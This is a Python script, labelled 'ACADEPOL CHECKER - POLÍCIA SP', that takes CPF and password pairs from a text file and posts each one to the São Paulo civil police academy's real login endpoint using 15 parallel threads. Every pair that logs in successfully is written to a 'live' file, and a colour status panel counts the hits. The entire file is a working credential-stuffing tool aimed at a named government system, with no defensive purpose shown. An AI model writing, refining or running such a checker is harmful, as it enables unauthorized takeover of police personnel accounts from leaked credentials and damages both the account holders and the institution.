import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
import time
import os

init(autoreset=True)

# Configurações
MAX_THREADS = 15
TIMEOUT = 10
LOGINS_FILE = "logins.txt"
LIVE_FILE = "live.txt"

# Contadores globais (thread-safe)
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

# Lock para escrita em arquivo
file_lock = threading.Lock()

# Painel de status
def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "    ACADEPOL CHECKER - POLÍCIA SP")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ VÁLIDOS: {stats['live']}")
    print(Fore.RED + f" ❌ INVÁLIDOS: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROS: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

# Função de login
def test_login(cpf, senha):
    url = "https://dipol.policiacivil.sp.gov.br/acadepol/authentication"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://dipol.policiacivil.sp.gov.br",
        "Referer": "https://dipol.policiacivil.sp.gov.br/acadepol/login"
    }

    payload = {
        "cpf": cpf,
        "senha": senha,
        "r": ""
    }

    try:
        response = requests.post(
            url,
            headers=headers,
            data=payload,
            timeout=TIMEOUT,
            allow_redirects=False
        )

        if "window.location.href='login?l=e" in response.text:
            stats['die'] += 1
            return Fore.RED + f"[FALHA] {cpf}:{senha}"
        else:
            stats['live'] += 1
            with file_lock:
                with open(LIVE_FILE, 'a') as f:
                    f.write(f"{cpf}:{senha}\n")
            return Fore.GREEN + f"[SUCESSO] {cpf}:{senha}"

    except Exception as e:
        stats['error'] += 1
        return Fore.YELLOW + f"[ERRO] {cpf}:{senha} | {str(e)}"

# Processamento principal
def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r') as f:
        accounts = [line.strip().split(':') for line in f if ':' in line]

    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            cpf, senha = acc[0], acc[1]
            future = executor.submit(test_login, cpf, senha)
            futures.append(future)

        for future in futures:
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")

if __name__ == "__main__":
    main()